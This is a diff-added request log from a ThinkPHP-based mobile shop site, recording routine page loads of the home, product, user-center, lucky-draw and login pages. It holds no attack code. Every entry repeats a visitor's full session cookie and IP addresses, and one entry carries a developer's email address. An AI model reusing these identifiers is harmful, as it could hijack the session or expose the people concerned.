+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=13; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2013%2C%20%22expires%22%3A%201513080718833%7D; __51cke__=; __51laig__=13',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/goods/detail_html' => '',
+  'id' => '49',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method detail ] {
+  @@ E:\www\dbgj\application\index\controller\Goods.php 25 - 45
+}
+
+[ info ] [ VIEW ] ./themes/default/index/goods_detail.html [ array (
+  0 => 'userinfo',
+  1 => 'data',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:42:26+08:00 ] 172.31.179.54 49.118.138.184 GET /index/index/index.html
+[ log ] dbgj.hoonking.com/index/index/index.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,218.52kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=13; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2013%2C%20%22expires%22%3A%201513080718833%7D; __51cke__=; __51laig__=13',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/index/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Index.php 21 - 28
+}
+
+[ info ] [ VIEW ] ./themes/default/index/index.html [ array (
+  0 => 'userinfo',
+  1 => 'goodslist',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:42:50+08:00 ] 172.31.179.54 49.118.138.184 GET /index/index/index.html
+[ log ] dbgj.hoonking.com/index/index/index.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,218.51kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=13; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2013%2C%20%22expires%22%3A%201513080718833%7D; __51cke__=; __51laig__=13',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/index/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Index.php 21 - 28
+}
+
+[ info ] [ VIEW ] ./themes/default/index/index.html [ array (
+  0 => 'userinfo',
+  1 => 'goodslist',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:42:54+08:00 ] 172.31.179.54 49.118.138.184 GET /index/index/index.html
+[ log ] dbgj.hoonking.com/index/index/index.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,218.52kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=13; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2013%2C%20%22expires%22%3A%201513080718833%7D; __51cke__=; __51laig__=13',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/index/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Index.php 21 - 28
+}
+
+[ info ] [ VIEW ] ./themes/default/index/index.html [ array (
+  0 => 'userinfo',
+  1 => 'goodslist',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:42:56+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.125000s][吞吐率：8.00req/s] [内存消耗：2,294.66kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=13; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2013%2C%20%22expires%22%3A%201513080718833%7D; __51cke__=; __51laig__=13',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:42:59+08:00 ] 172.31.179.54 49.118.138.184 GET /index/lucky/index.html
+[ log ] dbgj.hoonking.com/index/lucky/index.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,184.29kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'lucky',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=13; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2013%2C%20%22expires%22%3A%201513080718833%7D; __51cke__=; __51laig__=13',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/lucky/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Lucky.php 12 - 18
+}
+
+[ info ] [ VIEW ] ./themes/default/index/lucky.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'list',
+  3 => 'web_lucky_score',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:43:34+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.109375s][吞吐率：9.14req/s] [内存消耗：2,294.66kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=14; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2014%2C%20%22expires%22%3A%201513080782655%7D; __51cke__=; __51laig__=14',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:46:14+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.109375s][吞吐率：9.14req/s] [内存消耗：2,294.65kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=14; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2014%2C%20%22expires%22%3A%201513080782655%7D; __51cke__=; __51laig__=14',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:46:14+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.109375s][吞吐率：9.14req/s] [内存消耗：2,294.66kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=14; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2014%2C%20%22expires%22%3A%201513080782655%7D; __51cke__=; __51laig__=14',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:46:33+08:00 ] 172.31.179.54 49.118.138.184 GET /index/base/login.html
+[ log ] dbgj.hoonking.com/index/base/login.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,183.79kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=14; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2014%2C%20%22expires%22%3A%201513080782655%7D; __51cke__=; __51laig__=14',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/base/login_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
